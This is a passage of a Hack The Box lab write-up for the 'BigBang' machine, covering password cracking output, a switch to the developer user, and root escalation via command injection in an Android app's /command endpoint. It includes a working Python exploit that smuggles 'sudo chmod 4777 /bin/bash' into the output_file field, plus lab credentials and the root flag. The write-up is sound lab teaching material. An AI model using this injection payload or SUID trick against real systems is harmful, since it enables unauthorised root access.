Amplifier:0-1 Iteration:9984-9999</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: horoscope -&gt; emoemo</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Util: 92%</span></span><br><span class="line"></span><br><span class="line">Started: Fri Jan 31 20:27:43 2025</span><br><span class="line">Stopped: Fri Jan 31 20:28:09 2025</span><br></pre></td></tr></table></figure></div>
+
+<p><code>developer:bigbang</code></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.1$ su developer</span><br><span class="line">Password:</span><br><span class="line">bash-5.1$ <span class="built_in">id</span></span><br><span class="line">uid=1002(developer) gid=1002(developer) <span class="built_in">groups</span>=1002(developer)</span><br><span class="line">bash-5.1$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-to-root-command-injection-in-Android-App"><a href="#Privilege-Escalation-to-root-command-injection-in-Android-App" class="headerlink" title="Privilege Escalation to root - command injection in Android App"></a>Privilege Escalation to root - command injection in Android App</h3><p>Checking developer’s home directory, we can find an <code>android</code> folder with a <code>satellite-app.apk</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ <span class="built_in">pwd</span></span><br><span class="line">/home/developer/android</span><br><span class="line">bash-5.1$ <span class="built_in">ls</span></span><br><span class="line">satellite-app.apk</span><br></pre></td></tr></table></figure></div>
+
+<p>We can transfer that to our machine and open it with jadx:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BigBang/jadx.png"
+                      alt="Android Application"
+                ><figcaption>Android Application</figcaption></figure></p>
+<p>We can see from the code that we have two endpoints: <code>/login</code> and <code>/command</code>, <code>/command</code> is vulnerable to command injection through malicious input inside the <code>output_file</code> parameter:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BigBang/login.png"
+                      alt="Android Application"
+                ><figcaption>Android Application</figcaption></figure><br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BigBang/command.png"
+                      alt="Android Application"
+                ><figcaption>Android Application</figcaption></figure></p>
+<p>Therefore we can craft a script that maliciously modifies our <code>/bin/bash</code> binary by adding the SUID bit to it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests as s</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">r = s.post(<span class="string">&quot;http://127.0.0.1:9090/login&quot;</span>, json=&#123;</span><br><span class="line"> <span class="string">&quot;username&quot;</span>: <span class="string">&quot;developer&quot;</span>,</span><br><span class="line"> <span class="string">&quot;password&quot;</span>: <span class="string">&quot;bigbang&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">token = r.json()[<span class="string">&quot;access_token&quot;</span>]</span><br><span class="line">r = s.post(<span class="string">&quot;http://127.0.0.1:9090/command&quot;</span>, headers=&#123;</span><br><span class="line"><span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer &quot;</span> + token</span><br><span class="line">&#125;, json=&#123;</span><br><span class="line"><span class="string">&quot;command&quot;</span>: <span class="string">&quot;send_image&quot;</span>,</span><br><span class="line"> <span class="string">&quot;output_file&quot;</span>: <span class="string">&quot;/tmp/privesc\n sudo chmod 4777 /bin/bash&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we just have to execute it and then take our root access:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ python3 privesc.py</span><br><span class="line">&#123;<span class="string">&quot;access_token&quot;</span>:<span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0NjA5MDIyNiwianRpIjoiNTk1NWMxN2YtY2NjMi00N2IzLWFmODUtM2Y3MTY0NDI1NjVkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTc0NjA5MDIyNiwiY3NyZiI6IjI3OWU0MDRiLTc2ZTktNDBmMy05NTA2LWNjNTBlMzcwZDRmMiIsImV4cCI6MTc0NjA5MzgyNn0.RHZwPJtfIc_Pv0ZvQQZ4pY0ERb4ILrzE44hb1OGLpm4&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Error reading image file: [Errno 2] No such file or directory: &#x27;/tmp/privesc\\n sudo chmod 4777 /bin/bash&#x27;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">bash-5.1$ <span class="built_in">ls</span> -al /bin/bash</span><br><span class="line">-rwsrwxrwx 1 root root 1396520 Mar 14  2024 /bin/bash</span><br><span class="line">bash-5.1$ bash -p</span><br><span class="line">bash-5.1<span class="comment"># id</span></span><br><span class="line">uid=1002(developer) gid=1002(developer) euid=0(root) <span class="built_in">groups</span>=1002(developer)</span><br><span class="line">bash-5.1<span class="comment"># cat /root/root.txt</span></span><br><span class="line">d1f908f36f5d09229ab692f15794d763</span><br></pre></td></tr></table></figure></div>
+
+<p>And that was it for BigBang, hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: BigBang</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-04-30 19:45:32</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-05-01 10:16:48
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/04/30/Hackthebox-BigBang/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/04/22/Certified-Red-Team-Expert-CRTE-Review/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Certified Red Team Expert (CRTE) - Review 🚀</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: BigBang</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-blog-bigbang-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;blog.bigbang.htb&#x2F; </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lateral-Movement-to-developer-Grafana-Database-Exfiltration"><span class="nav-text">Lateral Movement to developer - Grafana Database Exfiltration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-to-root-command-injection-in-Android-App"><span class="nav-text">Privilege Escalation to root - command injection in Android App</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
